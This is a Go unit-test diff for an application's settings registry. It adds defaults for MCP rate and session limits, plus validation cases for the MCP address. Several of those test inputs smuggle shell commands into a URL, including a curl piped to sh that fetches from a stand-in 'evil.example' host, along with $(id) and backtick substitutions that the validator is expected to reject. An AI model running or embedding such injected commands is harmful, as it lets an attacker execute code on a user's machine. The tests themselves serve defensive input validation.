@@ -102,6 +102,7 @@ func TestSettingsDefaults(t *testing.T) {
 		config.KeyMCPPrivateDocuments: false,
 		config.KeyMCPSkipConsent:      true,
 		config.KeyMCPRate:             120,
+		config.KeyMCPUserRate:         600,
 		config.KeyMCPAccessTTL:        time.Hour,
 		config.KeyMCPRefreshTTL:       30 * 24 * time.Hour,
 		config.KeyMCPConfirmFor:       time.Hour,
@@ -113,6 +114,9 @@ func TestSettingsDefaults(t *testing.T) {
 		config.KeyMCPClients:          config.MCPClients,
 		config.KeyMCPAddress:          "",
 		config.KeyMCPSessionIdle:      time.Hour,
+		config.KeyMCPSessionsPerAgent: 10,
+		config.KeyMCPSessionsPerUser:  30,
+		config.KeyMCPNewSessions:      30,
 		config.KeyTrustedProxies:      []string{},
 		config.KeyWebhookAllowPrivate: false,
 		config.KeyGitHubStars:         true,
@@ -133,7 +137,7 @@ func TestSettingsDefaults(t *testing.T) {
 		assert.Equal(t, want, spec(t, key).Default, key)
 	}
 
-	assert.Len(t, registry(t).Specs(), 81, "every setting has a default checked above")
+	assert.Len(t, registry(t).Specs(), 85, "every setting has a default checked above")
 
 	for _, key := range []string{
 		config.KeyTelegramToken, config.KeyBuilderAPIKey, config.KeyBuilderSecret, config.KeyBuilderPassphrase, config.KeyPolygonRPC,
@@ -204,6 +208,17 @@ func TestSettingsValidation(t *testing.T) {
 		{config.KeyPluginTrustedKeys, "untrusted comment: minisign public key E7620F1842B4E81F", "is not a minisign public key"},
 		{config.KeyPluginsDir, " ", "it cannot be empty"},
 		{config.KeyPluginMaxArchive, "4096", "must be between 1 and 2048"},
+		// Users paste the MCP address into a shell or a config file (A8).
+		{config.KeyMCPAddress, "https://poly.example/mcp;curl -s https://evil.example/x|sh", "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/mcp#;curl evil.example|sh", "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/mcp$(id)", "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/mcp`id`", "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/mcp && id", "with a plain path"},
+		{config.KeyMCPAddress, `https://poly.example/mcp"x`, "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/mcp?x=1", "with a plain path"},
+		{config.KeyMCPAddress, "https://user:pw@poly.example/mcp", "with a plain path"},
+		{config.KeyMCPAddress, "https://poly.example/m%63p", "with a plain path"},
+		{config.KeyMCPAddress, "ftp://poly.example/mcp", "with a plain path"},
 	}
 
 	for _, tc := range tests {
@@ -230,6 +245,11 @@ func TestSettingsValidation(t *testing.T) {
 
 	_, err = spec(t, config.KeyBuilderCode).Parse("0x" + strings.Repeat("0b", 32))
 	require.NoError(t, err, "a builder code")
+
+	for _, addr := range []string{"https://poly.example/mcp", "http://10.0.0.5:8080/agents/mcp", "https://[::1]:8443/mcp", ""} {
+		_, err = spec(t, config.KeyMCPAddress).Parse(addr)
+		require.NoError(t, err, addr)
+	}
 
 	_, err = spec(t, config.KeyTelegramToken).Parse("123456:ABC-DEF_ghi")
 	require.NoError(t, err, "a bot token")
